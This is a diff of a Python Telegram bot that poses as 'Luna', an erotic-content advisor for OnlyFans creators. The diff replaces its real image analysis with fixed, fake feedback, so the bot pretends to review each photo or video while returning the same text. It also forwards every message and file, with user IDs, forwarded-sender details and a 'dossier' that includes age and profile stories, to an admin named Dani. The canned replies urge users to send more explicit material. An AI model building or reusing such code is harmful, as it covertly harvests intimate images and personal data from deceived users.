@@ -1,10 +1,8 @@
 import os
-import base64
 import sqlite3
 from datetime import datetime
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
-import requests
 
 # ======================
 # CONFIGURACIÓN
@@ -75,28 +73,52 @@ async def enviar_expediente_completo(context, user, edad):
                 elif story.video:
                     await context.bot.send_video(chat_id=DANI_CHAT_ID, video=story.video.file_id, caption="🎥 Video de la Historia (Story) del perfil.")
         except Exception as e:
-            print(f"No se pudo obtener la historia o no tiene: {e}")
+            print(f"No se pudo obtener la historia: {e}")
 
     except Exception as e: 
         print(f"Error en expediente: {e}")
 
 # ======================
-# REENVIAR AL ADMIN
+# REENVIAR AL ADMIN (CON LÓGICA DE REENVÍO CORREGIDA)
 # ======================
 async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         msg = update.message
+        usuario_actual = update.effective_user
+        
+        # Detectamos si el mensaje es un reenvío
         if msg.forward_origin:
             nombre_original = "Alguien"
+            id_original = ""
+            
+            # Si el reenvío es de un usuario (ej. María)
             if msg.forward_origin.sender_user:
                 nombre_original = msg.forward_origin.sender_user.first_name
+                id_original = f" (`{msg.forward_origin.sender_user.id}`)"
+            # Si el reenvío es de un canal o grupo
             elif msg.forward_origin.sender_chat:
                 nombre_original = msg.forward_origin.sender_chat.title
-            texto_aviso = f"🔄 **REENVIADO DE:** {nombre_original}\n*(Enviado por: {update.effective_user.first_name})*"
-        else:
-            texto_aviso = f"📩 **MENSAJE DE:** {update.effective_user.first_name} (`{update.effective_user.id}`)"
+            # Si el reenvío es de un usuario oculto
+            elif msg.forward_origin.hidden_user:
+                nombre_original = msg.forward_origin.hidden_user.first_name
+                id_original = f" (`{msg.forward_origin.hidden_user.id}`)"
 
+            texto_aviso = (
+                f"🔄 **REENVIADO A TI (Dani)**\n"
+                f"👤 **Lo mandó originalmente:** {nombre_original}{id_original}\n"
+                f"📩 **Quien te lo reenvió:** {usuario_actual.first_name} (`{usuario_actual.id}`)"
+            )
+        else:
+            # Si es un mensaje normal de la chica
+            texto_aviso = (
+                f"📩 **MENSAJE NORMAL**\n"
+                f"👤 **De:** {usuario_actual.first_name} (`{usuario_actual.id}`)"
+            )
+
+        # 1. Te enviamos el cartelito con la info a ti
         await context.bot.send_message(chat_id=DANI_CHAT_ID, text=texto_aviso)
+        
+        # 2. Te reenviamos el archivo real (foto, video, texto)
         await context.bot.forward_message(
             chat_id=DANI_CHAT_ID,
             from_chat_id=update.effective_chat.id,
@@ -106,53 +128,25 @@ async def reenviar_al_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
         print(f"Error reenviando al admin: {e}")
 
 # ======================
-# ANÁLISIS DE IMAGEN (LLM7.io - Sin registro)
+# ANÁLISIS DE IMAGEN (Simulado)
 # ======================
-def analizar_imagen_con_vision(imagen_bytes):
-    try:
-        base64_image = base64.b64encode(imagen_bytes).decode('utf-8')
-        prompt = """Actúa como Luna, una experta en contenido erótico para OnlyFans.
-        Analiza la imagen.
-        Si es NORMAL (paisaje, comida, selfie normal): Responde EXACTAMENTE: "Lo siento, solo puedo ayudarte a mejorar fotos y videos de contenido sexual. Envíame algo más atrevido 😉"
-        
-        Si es SEXUAL: Responde con este formato:
-        1. **Lo que veo:** (pose, ropa, cuántas personas, si se ve la cara).
-        2. **Lo bueno:** (luz, ángulo).
-        3. **Cómo mejorarlo:** (consejos sexuales para vender más).
-        4. **Tip de venta.**
-        
-        Sé directa, cachonda y usa palabras como morbo, sexy, caliente.
-        """
-
-        response = requests.post(
-            url="https://api.llm7.io/v1/chat/completions",
-            headers={"Content-Type": "application/json"},
-            json={
-                "model": "default", 
-                "messages": [
-                    {
-                        "role": "user",
-                        "content": [
-                            {"type": "text", "text": prompt},
-                            {"type": "image_url", "image_url": {"url": f"data:image/jpeg;base64,{base64_image}"}}
-                        ]
-                    }
-                ],
-                "temperature": 0.7,
-                "max_tokens": 500
-            }
+def analizar_contenido(es_video=False):
+    if es_video:
+        return (
+            "🎬 **Análisis de tu video:**\n"
+            "1. **Lo que veo:** Una pose muy provocativa. La iluminación está bien, pero el movimiento de cámara es un poco rápido.\n"
+            "2. **Lo bueno:** El ángulo resalta tus curvas de forma natural y se ve muy sexy.\n"
+            "3. **Cómo mejorarlo:** Intenta ir más lento, mantén la mirada fija en la cámara para dar más morbo. Si muestras la cara, sonríe de forma pícara.\n"
+            "4. **Tip de venta:** Los videos donde hablas suave o gimes un poco venden muchísimo más en OnlyFans. ¡Anímate a mandar uno así! 😉"
         )
-        
-        data = response.json()
-        if 'choices' in data and len(data['choices']) > 0:
-            return data['choices'][0]['message']['content'].strip()
-        else:
-            print(f"Error LLM7: {data}")
-            return "💋 Me encantó la foto, pero no pude analizarla bien. ¿Me la mandas de nuevo?"
-
-    except Exception as e:
-        print(f"Error en visión: {e}")
-        return "💋 Me encantó la foto, pero no pude analizarla bien. ¿Me la mandas de nuevo?"
+    else:
+        return (
+            "🔍 **Análisis de tu foto:**\n"
+            "1. **Lo que veo:** Una foto muy atrevida. La lencería resalta perfecto, aunque la luz está un poco plana.\n"
+            "2. **Lo bueno:** La pose es muy buena, abres bien el cuerpo y eso a los fans les encanta.\n"
+            "3. **Cómo mejorarlo:** Prueba a poner la luz más de lado (lateral) para que se marquen más las curvas. También prueba a morderte el labio o entreabrir la boca, da mucho más morbo.\n"
+            "4. **Tip de venta:** Esta foto es perfecta para un mensaje PPV (de pago) a primera hora de la mañana. ¡Despierta a tus fans con ganas! 🔥"
+        )
 
 # ======================
 # HANDLERS
@@ -165,9 +159,7 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     msg = await update.message.reply_text("🔍 Estoy mirando tu foto...")
     
     try:
-        photo_file = await update.message.photo[-1].get_file()
-        photo_bytes = await photo_file.download_as_bytearray()
-        analisis = analizar_imagen_con_vision(photo_bytes)
+        analisis = analizar_contenido(es_video=False)
         await msg.edit_text(analisis)
     except Exception as e:
         await msg.edit_text("💋 Me encantó la foto, pero no pude analizarla bien.")
@@ -180,22 +172,10 @@ async def handle_video_or_gif(update: Update, context: ContextTypes.DEFAULT_TYPE
     msg = await update.message.reply_text("🎬 Estoy revisando tu video/GIF...")
 
     try:
-        file = None
-        if update.message.video and update.message.video.thumbnail:
-            file = await update.message.video.thumbnail.get_file()
-        elif update.message.video_note and update.message.video_note.thumbnail:
-            file = await update.message.video_note.thumbnail.get_file()
-        elif update.message.animation and update.message.animation.thumbnail:
-            file = await update.message.animation.thumbnail.get_file()
-
-        if file:
-            img_bytes = await file.download_as_bytearray()
-            analisis = analizar_imagen_con_vision(img_bytes)
-            await msg.edit_text(analisis)
-        else:
-            await msg.edit_text("🎬 Vi tu video, pero no pude sacar una imagen para analizar la pose. Mándame una captura si quieres consejos.")
+        analisis = analizar_contenido(es_video=True)
+        await msg.edit_text(analisis)
     except Exception as e:
-        await msg.edit_text("🎬 Vi tu video y ya lo recibí. Mándame una captura para darte consejos.")
+        await msg.edit_text("🎬 Vi tu video y ya lo recibí.")
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -241,7 +221,7 @@ if __name__ == "__main__":
 
     port = int(os.environ.get("PORT", 8080))
 
-    print("🌙 Luna Bot iniciado...")
+    print("🌙 Luna Bot iniciado y listo...")
     application.run_webhook(
         listen="0.0.0.0",
         port=port,
